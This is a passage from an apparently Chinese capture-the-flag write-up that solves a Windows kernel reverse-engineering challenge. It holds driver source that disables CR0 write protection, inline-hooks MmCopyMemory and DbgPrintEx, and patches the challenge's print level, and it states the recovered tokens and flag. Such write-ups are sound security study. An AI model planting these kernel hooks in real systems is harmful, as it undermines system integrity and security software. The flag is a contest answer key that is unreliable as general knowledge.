__writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = oldcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = newcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*Copy)</span><span class="params">(PVOID, MM_COPY_ADDRESS, SIZE_T, ULONG, SIZE_T *)</span>;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">bianliqudongmokuai</span><span class="params">(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, FALSE))</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Found Module!\n&quot;</span>));</span><br><span class="line">            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line">    <span class="title function_">myMmCopyMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID TargetAddress,</span></span><br><span class="line"><span class="params">    _In_ MM_COPY_ADDRESS SourceAddress,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T NumberOfBytes,</span></span><br><span class="line"><span class="params">    _In_ ULONG Flags,</span></span><br><span class="line"><span class="params">    _Out_ PSIZE_T NumberOfBytesTransferred</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!BaseAddr) &#123;</span><br><span class="line">        UNICODE_STRING name;</span><br><span class="line">        RtlInitUnicodeString(&amp;name, <span class="string">L&quot;ace.sys&quot;</span>);</span><br><span class="line">        bianliqudongmokuai(&amp;name,&amp;BaseAddr,&amp;DLLSize);</span><br><span class="line">        <span class="keyword">if</span> (!BaseAddr) &#123;</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PVOID backtrace[MAX_BACKTRACE_DEPTH];</span><br><span class="line">    USHORT capturedFrames = RtlCaptureStackBackTrace(<span class="number">0</span>, MAX_BACKTRACE_DEPTH, backtrace, <span class="literal">NULL</span>);</span><br><span class="line">    UINT64 addr = BaseAddr;</span><br><span class="line">    UINT64 size = DLLSize;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (USHORT i = <span class="number">0</span>; i &lt; capturedFrames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (backtrace[i] &gt;= addr &amp;&amp; backtrace[i] &lt;= addr + size) &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233: calls MmCopyMemory(%p,%p,%d,%p,%p)\n&quot;</span>), TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);</span><br><span class="line">        kprintf((<span class="string">&quot;Here is data: &quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (INT64 i = <span class="number">0</span>; i &lt; NumberOfBytes; i++) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;%02x &quot;</span>), *((<span class="type">unsigned</span> <span class="type">char</span>*)SourceAddress.VirtualAddress + i));</span><br><span class="line">        &#125;</span><br><span class="line">        kprintf((<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    end:</span><br><span class="line">    Unhook();</span><br><span class="line">    Copy func = (Copy)target;</span><br><span class="line">    NTSTATUS s = func(TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);</span><br><span class="line">    Hook();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start unload\n&quot;</span>), __LINE__);</span><br><span class="line">    Unhook();</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    CreateDevice(DriverObject);</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: RegistryPath = %S\n&quot;</span>), __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    target = MmCopyMemory;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: MmCopyMemory=%p\n&quot;</span>), __LINE__, target);</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    <span class="keyword">if</span> (target) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(oldcode); i++) &#123;</span><br><span class="line">            oldcode[i] = target[i];</span><br><span class="line">        &#125;</span><br><span class="line">        *(UINT64*)(newcode + <span class="number">2</span>) = myMmCopyMemory;</span><br><span class="line">        Hook();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:hahaha&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果直接没有调用过。后面还同样的方法 hook 了其它的 API，诸如 KeStackAttachProcess 的，同样没有调用，于是陷入沉思，既然它没有把 token 写到 r3 那大概率在 r0 层。</p><p>同时在一次巧合中（开了 DbgView 的 verbose），发现 token 直接打印出来了。</p><img src="/2024/04/15/tencent-race-2024-pre/3.png" class=""><p>那么 token2 就出来了 <code>token2: 8b3f14a24d64f3e697957c252e3a5686</code></p><p>所以 flag 就是 <code>flag&#123;757F4749AEBB1891EF5AC2A9B5439CEA-8b3f14a24d64f3e697957c252e3a5686&#125;</code></p><h4 id="编写程序，运行时修改尽量少的内存，让两段token输出成功。（满分2分）"><a href="#编写程序，运行时修改尽量少的内存，让两段token输出成功。（满分2分）" class="headerlink" title="编写程序，运行时修改尽量少的内存，让两段token输出成功。（满分2分）"></a>编写程序，运行时修改尽量少的内存，让两段token输出成功。（满分2分）</h4><p>首先看看内核层的输出吧，因为它本来就可以输出，直接调用的 DbgPrintEx 函数，只不过某个 Level 无法正常被接受罢了，尝试 hook 一下，看看 Level</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL <span class="string">L&quot;\\??\\xia0ji2333&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">UINT64 BaseAddr=<span class="literal">NULL</span>, DLLSize=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start delete device\n&quot;</span>), __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span class="comment">//CreateFile </span></span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Symbol\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;Sym);</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Device\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: end delete device\n&quot;</span>), __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *target;</span><br><span class="line"></span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = oldcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = newcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">bianliqudongmokuai</span><span class="params">(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, FALSE))</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Found Module!\n&quot;</span>));</span><br><span class="line">            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">ULONG</span><span class="params">(*FuncPtr)</span> <span class="params">(ULONG ComponentId,ULONG Level, PCSTR Format, ...)</span>;</span><br><span class="line"></span><br><span class="line">ULONG  <span class="title function_">myDbgPrintEx</span><span class="params">( ULONG ComponentId,ULONG Level,PCSTR Format, ... )</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Unhook();</span><br><span class="line">    FuncPtr func = (FuncPtr)target;</span><br><span class="line">    kprintf((<span class="string">&quot;call DbgPrintEx(%p,%p,%p)&quot;</span>), ComponentId, Level, Format);</span><br><span class="line">    DbgBreakPoint();</span><br><span class="line">    NTSTATUS s = func(ComponentId,Level,Format);</span><br><span class="line">    </span><br><span class="line">    Hook();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start unload\n&quot;</span>), __LINE__);</span><br><span class="line">    Unhook();</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: RegistryPath = %S\n&quot;</span>), __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    target = DbgPrintEx;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: DbgPrintEx=%p\n&quot;</span>), __LINE__, target);</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    <span class="keyword">if</span> (target) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(oldcode); i++) &#123;</span><br><span class="line">            oldcode[i] = target[i];</span><br><span class="line">        &#125;</span><br><span class="line">        *(UINT64*)(newcode + <span class="number">2</span>) = myDbgPrintEx;</span><br><span class="line">        Hook();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:hahaha&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>持续输出了 <code>call DbgPrintEx(0000000000000000,0000000000000005,FFFFF1001067EB90)</code> Level&#x3D;5几乎不能输出任何内容了，因此尝试hook替换让它可以输出，但是这里 Hook 还是太麻烦了，于是我选择打下断点之后栈回溯一下看看情况</p><img src="/2024/04/15/tencent-race-2024-pre/4.png" class=""><p>可以发现关键 call 之前，有对 edx 赋值为 5，那么直接修改这个指令，把 hook 解掉看看能否输出。</p><p>这里我选择手动改一下，一共发现了三个位置，特征都是差不多的，都把 <code>mov edx,5</code> 改成 <code>mov edx,0</code>。</p><img src="/2024/04/15/tencent-race-2024-pre/5.png" class=""><p>发现改完之后 token 成功输出了。</p><p>但是这里应该是驱动加载时候分配的内存写入的 shellcode，如果能知道地址，那么能去改掉这些指令，但是地址是我通过栈回溯找到的，如果没有hook掉系统 API，那么我根本不太可能去获取到shellcode的地址。于是想到它既然是不停地在打印的，必然创建了一个内核线程，那么我先遍历一下内核线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span>;</span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span>;</span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span 